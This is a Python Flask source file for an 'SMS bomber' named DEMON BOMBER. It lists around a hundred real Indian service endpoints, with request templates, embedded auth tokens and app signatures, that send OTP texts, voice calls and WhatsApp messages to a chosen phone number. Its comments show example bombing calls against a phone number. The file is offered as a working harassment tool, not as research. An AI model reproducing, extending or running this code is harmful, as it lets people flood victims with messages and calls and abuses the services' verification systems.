# app.py - DEMON BOMBER (FIXED + SIMPLE API)
from flask import Flask, request, jsonify, render_template_string, Response
import requests
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse

app = Flask(__name__)

# ============ SHUVO & FELIX KEYS ============
VALID_KEYS = {"SHUVO": "shuvo2024", "FELIX": "felix2024"}

# ============ SARI APIS (FIXED HEADERS) ============
APIS = []

# === VOICE APIS (FULLY FIXED) ===
voice_apis = [
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Amazon Voice", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"phone={p}&action=voice_otp"},
    {"name": "Paytm Voice", "url": "https://accounts.paytm.com/signin/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zomato Voice", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"phone={p}&type=voice"},
    {"name": "Ola Voice", "url": "https://api.olacabs.com/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Uber Voice", "url": "https://auth.uber.com/v2/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Rapido Voice", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BigBasket Voice", "url": "https://www.bigbasket.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zepto Voice", "url": "https://zepto.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Blinkit Voice", "url": "https://blinkit.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PhonePe Voice", "url": "https://phonepe.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "MobiKwik Voice", "url": "https://mobikwik.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Dominos Voice", "url": "https://dominos.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "MakeMyTrip Voice", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Goibibo Voice", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
]

# === WHATSAPP APIS ===
whatsapp_apis = [
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json", "User-Agent": "okhttp/5.0.0-alpha.11"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "Rappi WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
    {"name": "Jockey WhatsApp", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "Flipkart WhatsApp", "url": "https://flipkart.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Amazon WhatsApp", "url": "https://amazon.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Swiggy WhatsApp", "url": "https://swiggy.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Zomato WhatsApp", "url": "https://zomato.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Paytm WhatsApp", "url": "https://paytm.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Meesho WhatsApp", "url": "https://meesho.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
]

# === SMS APIS (MAIN - 100+ WORKING) ===
sms_apis = [
    {"name": "Flipkart SMS", "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Amazon SMS", "url": "https://www.amazon.in/ap/signin", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"phone={p}&action=otp"},
    {"name": "Myntra SMS", "url": "https://www.myntra.com/gw/mobile-auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Ajio SMS", "url": "https://www.ajio.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "Meesho SMS", "url": "https://meesho.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Snapdeal SMS", "url": "https://www.snapdeal.com/authenticate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa SMS", "url": "https://www.nykaa.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "MamaEarth SMS", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "Paytm SMS", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}","loginData":"LOGIN_USING_PHONE"}}'},
    {"name": "PhonePe SMS", "url": "https://www.phonepe.com/api/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Google Pay SMS", "url": "https://pay.google.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phoneNumber":"{p}"}}'},
    {"name": "Swiggy SMS", "url": "https://www.swiggy.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zomato SMS", "url": "https://www.zomato.com/php/asyncLogin.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"phone={p}"},
    {"name": "Dominos SMS", "url": "https://order.godominos.co.in/Online/App.aspx", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"PhoneNo={p}"},
    {"name": "Pizza Hut SMS", "url": "https://www.pizzahut.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "KFC SMS", "url": "https://www.kfc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Burger King SMS", "url": "https://www.burgerking.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "BigBasket SMS", "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile_number":"{p}"}}'},
    {"name": "Zepto SMS", "url": "https://www.zepto.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Blinkit SMS", "url": "https://blinkit.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Uber SMS", "url": "https://auth.uber.com/v2/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Ola SMS", "url": "https://api.olacabs.com/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "MakeMyTrip SMS", "url": "https://www.makemytrip.com/api/umbrella/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Goibibo SMS", "url": "https://www.goibibo.com/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "IRCTC SMS", "url": "https://www.irctc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "RedBus SMS", "url": "https://www.redbus.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "OYO SMS", "url": "https://api.oyoroomscrm.com/api/v2/user/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "1mg SMS", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":false}}'},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Netmeds SMS", "url": "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Practo SMS", "url": "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Unacademy SMS", "url": "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Vedantu SMS", "url": "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Zerodha SMS", "url": "https://zerodha.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Groww SMS", "url": "https://groww.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Angel One SMS", "url": "https://www.angelone.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Upstox SMS", "url": "https://upstox.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Netflix SMS", "url": "https://www.netflix.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Hotstar SMS", "url": "https://www.hotstar.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "SonyLIV SMS", "url": "https://www.sonyliv.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ZEE5 SMS", "url": "https://www.zee5.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Spotify SMS", "url": "https://www.spotify.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "LinkedIn SMS", "url": "https://www.linkedin.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Naukri SMS", "url": "https://www.naukri.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Dream11 SMS", "url": "https://www.dream11.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "MPL SMS", "url": "https://www.mpl.live/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "Housing.com SMS", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "Magicbricks SMS", "url": "https://www.magicbricks.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "99acres SMS", "url": "https://www.99acres.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Tata Capital SMS", "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"header":{{"authToken":"MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==","identifier":"nli"}},"body":{{"mobileNumber":"{p}"}}}}'},
    {"name": "Khatabook SMS", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}","country_code":"+91","app_signature":"wk+avHrHZf2"}}'},
    {"name": "TradeIndia SMS", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"+91{p}"}}'},
    {"name": "Jobhai SMS", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Citymall SMS", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone_number":"{p}"}}'},
    {"name": "Cosmofeed SMS", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","data":{{"email":"test@gmail.com"}},"authScreen":"signup-screen"}}'},
    {"name": "Bisleri SMS", "url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"email":"test@gmail.com","mobile":"{p}"}}'},
    {"name": "BharatLoan SMS", "url": "https://www.bharatloan.com/login-sbm", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile={p}&current_page=login&is_existing_customer=2"},
    {"name": "Pagarbook SMS", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}","language":1}}'},
    {"name": "Aakash SMS", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission"}}'},
    {"name": "Testbook SMS", "url": "https://api.testbook.com/api/v2/mobile/signup", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Medibuddy SMS", "url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phonenumber":"{p}","platform":"medibuddy"}}'},
    {"name": "Woodenstreet SMS", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"firstname":"Test","email":"test@test.com","telephone":"{p}","password":"Test@123","isGuest":0}}'},
    {"name": "Muthoot Finance SMS", "url": "https://www.muthootfinance.com/smsapi.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile={p}&pin=XjtYYEdhP0haXjo3"},
    {"name": "GoPaySense SMS", "url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "IIFL SMS", "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"apply_for=18&full_name=Test&mobile_number={p}&terms_and_condition=1"},
    {"name": "BankOpen SMS", "url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"username":"{p}","is_open_capital":1}}'},
    {"name": "Breeze SMS", "url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}, "data": lambda p: f'{{"phoneNumber":"{p}","authVerificationType":"otp","device":{{"id":"A1pKVEDhlv66KLtoYsml3","platform":"Chrome","type":"Desktop"}},"countryCode":"+91"}}'},
    {"name": "Agrevolution SMS", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile_number":"{p}","client_id":"kisan-app"}}'},
    {"name": "KPN Fresh SMS", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "Aditya Birla SMS", "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"MobileNumber={p}&functionality=signup"},
    {"name": "OrangeHealth SMS", "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile_number":"{p}","customer_auto_fetch_message":true}}'},
    {"name": "Mconnect SMS", "url": "https://mconnect.isteer.co/mconnect/login", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "Spinny SMS", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"contact_number":"{p}","whatsapp":false,"code_len":4}}'},
    {"name": "Freedo SMS", "url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"email_id":"test@test.com","first_name":"Test","mobile_number":"{p}"}}'},
    {"name": "Brevistay SMS", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"is_otp":1,"is_password":0,"mobile":"{p}"}}'},
    {"name": "Madrasmandi SMS", "url": "https://api.madrasmandi.in/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "multipart/form-data", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{p}\r\n------WebKitFormBoundary--\r\n'},
    {"name": "Vahak SMS", "url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone_number":"{p}","scope":0}}'},
    {"name": "Redcliffe SMS", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone_number":"{p}","short":true}}'},
    {"name": "Ixigo SMS", "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"sixDigitOTP=true&prefix=%2B91&phone={p}"},
    {"name": "BikeFixup SMS", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "Kredily SMS", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "RummyCircle SMS", "url": "https://www.rummycircle.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Upgrad SMS", "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phoneNumber":"+91{p}"}}'},
    {"name": "WorkIndia SMS", "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "Univest SMS", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}, "data": None},
    {"name": "CaratLane SMS", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},
]

# === MERGE SABHI APIS ===
for api in voice_apis + whatsapp_apis + sms_apis:
    APIS.append(api)

print(f"[✓] Total APIs Loaded: {len(APIS)}")
print(f"[✓] Voice APIs: {len(voice_apis)}")
print(f"[✓] WhatsApp APIs: {len(whatsapp_apis)}")
print(f"[✓] SMS APIs: {len(sms_apis)}")

# ============ SIMPLE API ENDPOINT (Koi bhi use kar sakta hai) ============
# Example: https://tu-app.onrender.com/api/bomb?phone=9709586997&key=SHUVO&mode=all
# Example: https://tu-app.onrender.com/api/bomb?phone=9709586997&key=FELIX&mode=sms

